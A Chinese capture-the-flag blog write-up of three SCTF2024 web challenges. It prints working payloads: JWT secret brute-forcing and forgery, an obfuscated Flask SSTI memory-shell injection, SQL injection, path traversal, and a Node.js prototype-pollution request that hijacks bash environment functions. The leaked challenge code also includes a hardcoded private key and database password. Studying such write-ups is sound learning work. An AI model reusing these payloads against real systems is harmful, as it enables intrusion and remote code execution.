+++
title = "SCTF2024"
slug = "sctf2024"
description = ""
date = "2024-10-02T11:17:26"
lastmod = "2024-10-02T11:17:26"
image = ""
license = ""
categories = ["赛题"]
tags = ["jwt", "flask", "nodejs"]
+++

# 0x01 前言

又是变成劳大的一个周末

# 0x02 question

## ezrender

这里进入之后是一个登录框，本来是黑盒的，但是后面给了代码和提示

```
ulimit -n =2048
```

先把代码放出来吧

app.py

```python
from flask import Flask, render_template, request, render_template_string,redirect
from verify import *
from User import User
import base64
from waf import waf

app = Flask(__name__,static_folder="static",template_folder="templates")
user={}

@app.route('/register', methods=["POST","GET"])
def register():
    method=request.method
    if method=="GET":
        return render_template("register.html")
    if method=="POST":
        data = request.get_json()
        name = data["username"]
        pwd = data["password"]
        if name != None and pwd != None:
            if data["username"] in user:
                return "This name had been registered"
            else:
                user[name] = User(name, pwd)
                return "OK"

@app.route('/login', methods=["POST","GET"])
def login():
    method=request.method
    if method=="GET":
        return render_template("login.html")
    if method=="POST":
        data = request.get_json()
        name = data["username"]
        pwd = data["password"]
        if name != None and pwd != None:
            if name not in user:
                return "This account is not exist"
            else:
                if user[name].pwd == pwd:
                    token=generateToken(user[name])
                    return "OK",200,{"Set-Cookie":"Token="+token}
                else:
                    return "Wrong password"

@app.route('/admin', methods=["POST","GET"])
def admin():
    try:
        token = request.headers.get("Cookie")[6:]
    except:
        return "Please login first"
    else:
        infor = json.loads(base64.b64decode(token))
        name = infor["name"]
        token = infor["secret"]
        result = check(user[name], token)

    method=request.method
    if method=="GET":
        return render_template("admin.html",name=name)
    if method=="POST":
        template = request.form.get("code")
        if result != "True":
            return result, 401
        #just only blackList
        if waf(template):
            return "Hacker Found"
        result=render_template_string(template)
        print(result)
        if result !=None:
            return "OK"
        else:
            return "error"

@app.route('/', methods=["GET"])
def index():
    return redirect("login")

@app.route('/removeUser', methods=["POST"])
def remove():
    try:
        token = request.headers.get("Cookie")[6:]
    except:
        return "Please login first"
    else:
        infor = json.loads(base64.b64decode(token))
        name = infor["name"]
        token = infor["secret"]
        result = check(user[name], token)
    if result != "True":
        return result, 401

    rmuser=request.form.get("username")
    user.pop(rmuser)
    return "Successfully Removed:"+rmuser

if __name__ == '__main__':
    # for the safe
    del __builtins__.__dict__['eval']
    app.run(debug=False, host='0.0.0.0', port=8080)
```

User.py

```python
import time
class User():
    def __init__(self,name,password):
        self.name=name
        self.pwd = password
        self.Registertime=str(time.time())[0:10]
        self.handle=None

        self.secret=self.setSecret()

    def handler(self):
        self.handle = open("/dev/random", "rb")
    def setSecret(self):
        secret = self.Registertime
        try:
            if self.handle == None:
                self.handler()
            secret += str(self.handle.read(22).hex())
        except Exception as e:
            print("this file is not exist or be removed")
        return secret
```

verify.py

```python
import json
import hashlib
import base64
import jwt
from app import *
from User import *
def check(user,crypt):
    verify_c=crypt
    secret_key = user.secret
    try:
        decrypt_infor = jwt.decode(verify_c, secret_key, algorithms=['HS256'])
        if decrypt_infor["is_admin"]=="1":
            return "True"
        else:
            return "You r not admin"
    except:
        return 'Don\'t be a Hacker!!!'

def generateToken(user):
    secret_key=user.secret
    secret={"name":user.name,"is_admin":"0"}

    verify_c=jwt.encode(secret, secret_key, algorithm='HS256')
    infor={"name":user.name,"secret":verify_c}
    token=base64.b64encode(json.dumps(infor).encode()).decode()
    return token

```

waf.py

```python
evilcode=["\\",
          "{%",
          "config",
          "session",
          "request",
          "self",
          "url_for",
          "current_app",
          "get_flashed_messages",
          "lipsum",
          "cycler",
          "joiner",
          "namespace",
          "chr",
          "request.",
          "|",
          "%c",
          "eval",
          "[",
          "]",
          "exec",
          "pop(",
          "get(",
          "setdefault",
          "getattr",
          ":",
          "os",
          "app"]
whiteList=[]
def waf(s):
    s=str(s.encode())[2:-1].replace("\\'","'").replace(" ","")
    if not s.isascii():
        return False
    else:
        for key in evilcode:
            if key in s:
                return True
    return False

```

先看了一下`waf`，肯定是要`flask`打SSTI的，`verify`这里肯定说明cookie是`jwt`，要伪造`admin`，但是现在的问题就是怎么拿到`cookie`，继续看代码

```python
    if method=="POST":
        template = request.form.get("code")
        if result != "True":
            return result, 401
        #just only blackList
        if waf(template):
            return "Hacker Found"
        result=render_template_string(template)
        print(result)
        if result !=None:
            return "OK"
        else:
            return "error"
```

注入点找到了，同时还发现了一个路由是用来移除用户的，同时转向观看，发现`secret`的获取方法

```python
    def handler(self):
        self.handle = open("/dev/random", "rb")
    def setSecret(self):
        secret = self.Registertime
        try:
            if self.handle == None:
                self.handler()
            secret += str(self.handle.read(22).hex())
        except Exception as e:
            print("this file is not exist or be removed")
        return secret
```

这里就和`hint`对上了,当一个文件被频繁`open`并且没有关闭时会有一个漏洞，当`unlimit`限制触发时会直接爆出时间戳，然后作为密钥，拿到`cookie`之后伪造，

先注册用户2048个用户，然后再注册1个用户此时先跑出时间戳

不过这里时间戳很难算准，所以还是爆破

```python
import time
from datetime import datetime,timezone

print(str(time.time())[0:10])
# 1727851840
```

后面生成字典来爆破

```python
# 定义起始和结束值
start = 1727576300
end = 1727576500

# 生成字典
my_dict = {i: i for i in range(start, end + 1)}

# 将字典的键写入文件，每行一个整数
with open('./output.txt', 'w') as f:
    for key in my_dict.keys():
        f.write(f"{key}\n")

print("整数已成功写入文件 output.txt")
```

然后上菜

```python
import jwt

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSmF5MTciLCJpc19hZG1pbiI6IjAifQ.3-9eh1iuZK33iblCxWIYGApfcGREUXpqht8FGKgG57U"
password_file = "./output.txt"  # 枚举密码字典文件

with open(password_file, 'rb') as file:
    for line in file:
        line = line.strip()  # 去除每行后面的换行
        try:
            jwt.decode(token, verify=True, key=line, algorithms=["HS256"])  # 设置编码方式为 HS256
            print('key: ', line.decode('ascii'))
            break
        except (jwt.exceptions.ExpiredSignatureError,
                jwt.exceptions.InvalidAudienceError,
                jwt.exceptions.InvalidIssuedAtError,
                jwt.exceptions.ImmatureSignatureError):
            # 出现这些错误，虽然表示过期之类的错误，但是密钥是正确的
            print("key: ", line.decode('ascii'))
            break
        except jwt.exceptions.InvalidSignatureError:
            # 签名错误则表示密钥不正确
            print("Failed: ", line.decode('ascii'))
            continue
    else:
        print("Not Found.")
```

然后我们就可以来伪造啦

```python
import time
import base64
import jwt
import json

key="1727576401"
secret={
  "name": "Jay17",
  "is_admin": "1"
}
verify=jwt.encode(secret,key,algorithm='HS256')
token_mini={
  "name": "Jay17",
  "secret": verify
}
token=base64.b64encode(json.dumps(token_mini).encode()).decode()
print(token)
```

伪造出来是这个

```
eyJuYW1lIjogIkpheTE3IiwgInNlY3JldCI6ICJleUpoYkdjaU9pSklVekkxTmlJc0luUjVjQ0k2SWtwWFZDSjkuZXlKdVlXMWxJam9pU21GNU1UY2lMQ0pwYzE5aFpHMXBiaUk2SWpFaWZRLjBuVkp5NmpEaC0yRVRFWUtZWmcxNmFMTWxURTBDbFdzTWtxUzdfRmVEbjAifQ==
```

删除多余用户，再打入内存马，主要就是SSTI的地方，禁用了`eval`，那我们就要拿`exec`，怎么拿，可以直接引号拼接，也可以使用小写

```
('e''xec')
('EXEC'.lower())
```

内存马我们之前写过，随便拿一个出来

```
url_for.__globals__.__builtins__['eval']("sys.modules['__main__'].__dict__['app'].before_request_funcs.setdefault(None, []).append(lambda:__import__('os').popen('whoami').read())")
```

但是我们现在没有`eval`，换成`exec`在本地实验一下

```
url_for.__globals__.__builtins__.__getitem__('e''xec')("__import__('sys').modules['__main__'].__dict__['app'].before_request_funcs.setdefault(None,[]).append(lambda :__import__('os').popen('whoami').read())")
```

成功了，但是还是需要绕过，因为里面有中括号，编码绕

```
(url_for.__globals__.__builtins__.__getitem__('e''xec'))("import base64;ex"+"ec(base64.b64decode('X19pbXBvcnRfXygnc3lzJykubW9kdWxlc1snX19tYWluX18nXS5fX2RpY3RfX1snYXBwJ10uYmVmb3JlX3JlcXVlc3RfZnVuY3Muc2V0ZGVmYXVsdChOb25lLFtdKS5hcHBlbmQobGFtYmRhIDpfX2ltcG9ydF9fKCdvcycpLnBvcGVuKCd3aG9hbWknKS5yZWFkKCkp'))")
```

欧克了，还差最后一点，就是`url_for`被搬了，那我们再改改就行了，对了上面的`payload`是`whoami`，这个也得改改

```
(g.pop.__globals__.__builtins__.__getitem__('e''xec'))("import base64;ex"+"ec(base64.b64decode('X19pbXBvcnRfXygnc3lzJykubW9kdWxlc1snX19tYWluX18nXS5fX2RpY3RfX1snYXBwJ10uYmVmb3JlX3JlcXVlc3RfZnVuY3Muc2V0ZGVmYXVsdChOb25lLFtdKS5hcHBlbmQobGFtYmRhIDpfX2ltcG9ydF9fKCdvcycpLnBvcGVuKCcvcmVhZGZsYWcnKS5yZWFkKCkp'))")
```

欧克了`/admin`，`POST`打入，然后`GET`得到`flag`

## SycServer2.0

查看源码发现防火墙，但是只是一个前端验证

控制台输入这个就可以绕过了

```
function wafsql(str) {console.log(str);return str;}
```

万能密码登录之后

```
1' or 1=1#
```

进入`/robots.txt`

```
User-agent: *
Disallow:
Disallow: /ExP0rtApi?v=static&f=1.jpeg
```

访问之后啥也没有，但是感觉像是任意文件读取

```
http://1.95.87.154:22734/ExP0rtApi?v=static&f=../../../etc/passwd
File not found
```

也就是说可行的，回到`hello`界面，看到这张图片是在当前目录

```
http://1.95.84.173:25482/ExP0rtApi?v=./&f=app.js
```

然后解base64之后保存为gzip，然后在继续解压得到文件

```js
const express = require('express');
const fs = require('fs');
var nodeRsa = require('node-rsa');
const bodyParser = require('body-parser');
const jwt = require('jsonwebtoken');
const crypto = require('crypto');
const SECRET_KEY = crypto.randomBytes(16).toString('hex');
const path = require('path');
const zlib = require('zlib');
const mysql = require('mysql')
const handle = require('./handle');
const cp = require('child_process');
const cookieParser = require('cookie-parser');

const con = mysql.createConnection({
  host: 'localhost',
  user: 'ctf',
  password: 'ctf123123',
  port: '3306',
  database: 'sctf'
})
con.connect((err) => {
  if (err) {
    console.error('Error connecting to MySQL:', err.message);
    setTimeout(con.connect(), 2000); // 2秒后重试连接
  } else {
    console.log('Connected to MySQL');
  }
});

const {response} = require("express");
const req = require("express/lib/request");

var key = new nodeRsa({ b: 1024 });
key.setOptions({ encryptionScheme: 'pkcs1' });

var publicPem = `-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5nJzSXtjxAB2tuz5WD9B//vLQ\nTfCUTc+AOwpNdBsOyoRcupuBmh8XSVnm5R4EXWS6crL5K3LZe5vO5YvmisqAq2IC\nXmWF4LwUIUfk4/2cQLNl+A0czlskBZvjQczOKXB+yvP4xMDXuc1hIujnqFlwOpGe\nI+Atul1rSE0APhHoPwIDAQAB\n-----END PUBLIC KEY-----`;
var privatePem = `-----BEGIN PRIVATE KEY-----
MIICeAIBADANBgkqhkiG9w0BAQEFAASCAmIwggJeAgEAAoGBALmcnNJe2PEAHa27
PlYP0H/+8tBN8JRNz4A7Ck10Gw7KhFy6m4GaHxdJWeblHgRdZLpysvkrctl7m87l
i+aKyoCrYgJeZYXgvBQhR+Tj/ZxAs2X4DRzOWyQFm+NBzM4pcH7K8/jEwNe5zWEi
6OeoWXA6kZ4j4C26XWtITQA+Eeg/AgMBAAECgYA+eBhLsUJgckKK2y8StgXdXkgI
lYK31yxUIwrHoKEOrFg6AVAfIWj/ZF+Ol2Qv4eLp4Xqc4+OmkLSSwK0CLYoTiZFY
Jal64w9KFiPUo1S2E9abggQ4omohGDhXzXfY+H8HO4ZRr0TL4GG+Q2SphkNIDk61
khWQdvN1bL13YVOugQJBAP77jr5Y8oUkIsQG+eEPoaykhe0PPO408GFm56sVS8aT
6sk6I63Byk/DOp1MEBFlDGIUWPjbjzwgYouYTbwLwv8CQQC6WjLfpPLBWAZ4nE78
dfoDzqFcmUN8KevjJI9B/rV2I8M/4f/UOD8cPEg8kzur7fHga04YfipaxT3Am1kG
mhrBAkEA90J56ZvXkcS48d7R8a122jOwq3FbZKNxdwKTJRRBpw9JXllCv/xsc2ye
KmrYKgYTPAj/PlOrUmMVLMlEmFXPgQJBAK4V6yaf6iOSfuEXbHZOJBSAaJ+fkbqh
UvqrwaSuNIi72f+IubxgGxzed8EW7gysSWQT+i3JVvna/tg6h40yU0ECQQCe7l8l
zIdwm/xUWl1jLyYgogexnj3exMfQISW5442erOtJK8MFuUJNHFMsJWgMKOup+pOg
xu/vfQ0A1jHRNC7t
-----END PRIVATE KEY-----`;

const app = express();
app.use(bodyParser.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'static')));
app.use(cookieParser());

var Reportcache = {}

function verifyAdmin(req, res, next) {
  const token = req.cookies['auth_token'];

  if (!token) {
    return res.status(403).json({ message: 'No token provided' });
  }

  jwt.verify(token, SECRET_KEY, (err, decoded) => {
    if (err) {
      return res.status(403).json({ message: 'Failed to authenticate token' });
    }

    if (decoded.role !== 'admin') {
      return res.status(403).json({ message: 'Access denied. Admins only.' });
    }

    req.user = decoded;
    next();
  });
}

app.get('/hello', verifyAdmin ,(req, res)=> {
  res.send('<h1>Welcome Admin!!!</h1><br><img src="./1.jpeg" />');
});

app.get('/config', (req, res) => {
  res.json({
    publicKey: publicPem,
  });
});

var decrypt = function(body) {
  try {
    var pem = privatePem;
    var key = new nodeRsa(pem, {
      encryptionScheme: 'pkcs1',
      b: 1024
    });
    key.setOptions({ environment: "browser" });
    return key.decrypt(body, 'utf8');
  } catch (e) {
    console.error("decrypt error", e);
    return false;
  }
};

app.post('/login', (req, res) => {
  const encryptedPassword = req.body.password;
  const username = req.body.username;

  try {
    passwd = decrypt(encryptedPassword)
    if(username === 'admin') {
      const sql = `select (select password from user where username = 'admin') = '${passwd}';`
      con.query(sql, (err, rows) => {
        if (err) throw new Error(err.message);
        if (rows[0][Object.keys(rows[0])]) {
          const token = jwt.sign({username, role: username}, SECRET_KEY, {expiresIn: '1h'});
          res.cookie('auth_token', token, {secure: false});
          res.status(200).json({success: true, message: 'Login Successfully'});
        } else {
          res.status(200).json({success: false, message: 'Errow Password!'});
        }
      });
    } else {
      res.status(403).json({success: false, message: 'This Website Only Open for admin'});
    }
  } catch (error) {
    res.status(500).json({ success: false, message: 'Error decrypting password!' });
  }
});

app.get('/ExP0rtApi', verifyAdmin, (req, res) => {
  var rootpath = req.query.v;
  var file = req.query.f;

  file = file.replace(/\.\.\//g, '');
  rootpath = rootpath.replace(/\.\.\//g, '');

  if(rootpath === ''){
    if(file === ''){
      return res.status(500).send('try to find parameters HaHa');
    } else {
      rootpath = "static"
    }
  }

  const filePath = path.join(__dirname, rootpath + "/" + file);

  if (!fs.existsSync(filePath)) {
    return res.status(404).send('File not found');
  }
  fs.readFile(filePath, (err, fileData) => {
    if (err) {
      console.error('Error reading file:', err);
      return res.status(500).send('Error reading file');
    }

    zlib.gzip(fileData, (err, compressedData) => {
      if (err) {
        console.error('Error compressing file:', err);
        return res.status(500).send('Error compressing file');
      }
      const base64Data = compressedData.toString('base64');
      res.send(base64Data);
    });
  });
});

app.get("/report", verifyAdmin ,(req, res) => {
  res.sendFile(__dirname + "/static/report_noway_dirsearch.html");
});

app.post("/report", verifyAdmin ,(req, res) => {
  const {user, date, reportmessage} = req.body;
  if(Reportcache[user] === undefined) {
    Reportcache[user] = {};
  }
  Reportcache[user][date] = reportmessage
  res.status(200).send("<script>alert('Report Success');window.location.href='/report'</script>");
});

app.get('/countreport', (req, res) => {
  let count = 0;
  for (const user in Reportcache) {
    count += Object.keys(Reportcache[user]).length;
  }
  res.json({ count });
});

//查看当前运行用户
app.get("/VanZY_s_T3st", (req, res) => {
  var command = 'whoami';
  const cmd = cp.spawn(command ,[]);
  cmd.stdout.on('data', (data) => {
    res.status(200).end(data.toString());
  });
})

app.listen(3000, () => {
  console.log('Server running on http://localhost:3000');
});
```

可以看到路由`/VanZY_s_T3st`，是有命令执行的情况的，看看能不能污染搞搞事情

并且看到可以继续读`child_process`

```
http://1.95.84.173:25482/ExP0rtApi?v=./handle&f=child_process.js
```

```js
function patchChildProcess(cp) {

    cp.execFile = new Proxy(cp.execFile, { apply: patchOptions(true) });
    cp.fork = new Proxy(cp.fork, { apply: patchOptions(true) });
    cp.spawn = new Proxy(cp.spawn, { apply: patchOptions(true) });
    cp.execFileSync = new Proxy(cp.execFileSync, { apply: patchOptions(true) });
    cp.execSync = new Proxy(cp.execSync, { apply: patchOptions() });
    cp.spawnSync = new Proxy(cp.spawnSync, { apply: patchOptions(true) });

    return cp;
}

function patchOptions(hasArgs) {
    return function apply(target, thisArg, args) {
        var pos = 1;
        if (pos === args.length) {
            args[pos] = prototypelessSpawnOpts();
        } else if (pos < args.length) {
            if (hasArgs && (Array.isArray(args[pos]) || args[pos] == null)) {
                pos++;
            }
            if (typeof args[pos] === 'object' && args[pos] !== null) {
                args[pos] = prototypelessSpawnOpts(args[pos]);
            } else if (args[pos] == null) {
                args[pos] = prototypelessSpawnOpts();
            } else if (typeof args[pos] === 'function') {
                args.splice(pos, 0, prototypelessSpawnOpts());
            }
        }

        return target.apply(thisArg, args);
    };
}

function prototypelessSpawnOpts(obj) {
    var prototypelessObj = Object.assign(Object.create(null), obj);
    prototypelessObj.env = Object.assign(Object.create(null), prototypelessObj.env || process.env);
    return prototypelessObj;
}

module.exports = patchChildProcess;
```

然后我不会nodejs的污染，找不到污染点了，我服了，最后看WP是说`/report`的`reportmessage`是污染点，然后我们污染`data`，劫持环境变量

看包

```
POST /report HTTP/1.1
Host: 1.95.84.173:31689
Content-Length: 194
Pragma: no-cache
Cache-Control: no-cache
Origin: http://1.95.84.173:31689
Content-Type: application/json
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://1.95.84.173:31689/report
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzI3ODQ0NDUyLCJleHAiOjE3Mjc4NDgwNTJ9.uNUp5ji7BoyUboeHKi-L_OVZygisZRhdLNSWZBUl7Eo
Connection: close

{
    "user": "__proto__",
    "date": "2",
    "reportmessage": {
        "shell": "/bin/bash",
        "env": {
            "BASH_FUNC_whoami%%": "() { /readflag; }"
        }
    }
}
```

这里自己写包的时候一直不对，问了一下AI就通了，我不如AI(~~呜呜呜~~)查看`flag`，访问`/VanZY_s_T3st`

![2](QQ20241002-125733.png)

## havefun

得到提示但是我还是看了很久的图不过后来我灵机一动，存下来放到010里面得到了源码

```php
<?php
$file = '/etc/apache2/sites-available/000-default.conf';
$content = file_get_contents($file);
echo htmlspecialchars($content);
?>
```

还有的信息就是这个

```
Database
information_schema
mysql
performance_schema
redmine_default
secret
sys
```

哦豁又给卡着了，后面知道可以像这样来使得图片被作为`php`解析

```
http://1.95.14.236/static/SCTF.jpg/1.php
```

看到最后面有这个，在`010`里面没出现的东西

```
<VirtualHost *:80>
    # The ServerName directive sets the request scheme, hostname and port that
    # the server uses to identify itself. This is used when creating
    # redirection URLs. In the context of virtual hosts, the ServerName
    # specifies what hostname must appear in the request's Host: header to
    # match this virtual host. For the default virtual host (this file) this
    # value is not decisive as it is used as a last resort host regardless.
    # However, you must set it for any further virtual host explicitly.
    # ServerName www.example.com

    # 服务器管理员的电子邮件地址
    ServerAdmin webmaster@localhost

    # 文档根目录
    DocumentRoot /var/www/html

    # Phusion Passenger 应用程序的根目录
    PassengerAppRoot /usr/share/redmine

    # 错误日志文件路径
    ErrorLog ${APACHE_LOG_DIR}/error.log

    # 访问日志文件路径
    CustomLog ${APACHE_LOG_DIR}/access.log combined

    # Redmine 应用程序目录的配置
    <Directory /var/www/html/redmine>
        # Rails 应用程序的基本 URI
        RailsBaseURI /redmine

        # 如果需要在文档根目录中解析符号链接，取消注释以下行
        # PassengerResolveSymlinksInDocumentRoot on
    </Directory>

    # 可用的日志级别：trace8, ..., trace1, debug, info, notice, warn,
    # error, crit, alert, emerg。
    # 也可以为特定模块配置日志级别，例如：
    # LogLevel info ssl:warn

    # 启用重写引擎
    RewriteEngine On

    # 重写规则，用于处理 PHP 文件
    RewriteRule ^(.+\.php)$ $1 [H=application/x-httpd-php]

    # 设置重写模块的日志级别
    LogLevel alert rewrite:trace3

    # 再次启用重写引擎（如果需要）
    RewriteEngine On

    # 重写规则，用于处理个人资料页面
    RewriteRule ^/profile/(.*)$ /$1.html

    # 对于大多数来自 conf-available/ 目录的配置文件，
    # 可以在全局级别启用或禁用它们。可以通过在特定虚拟主机中
    # 包含一行来仅为此虚拟主机启用某个配置文件。例如，
    # 下面的行在全局禁用后重新启用 CGI 配置。
    # Include conf-available/serve-cgi-bin.conf
</VirtualHost>
```

```
RewriteRule ^(.+\.php)$ $1 [H=application/x-httpd-php]
RewriteRule ^/profile/(.*)$ /$1.html
```

有这两个特殊的玩意，但是不知道咋用，欧克驾崩，看了WP也看不懂

## 问卷

随便写，但是影响最深的应该是havefun，还有就是怎么给图片啊，我自己识别错好几个字符，最后还要手敲

# 0x03 小结

浮现也这么难搞吗，这三个题是当时有思路但是中途就给卡着，干不动了，所以这次比赛仍然是爆零的劳大，学到了一些东西！
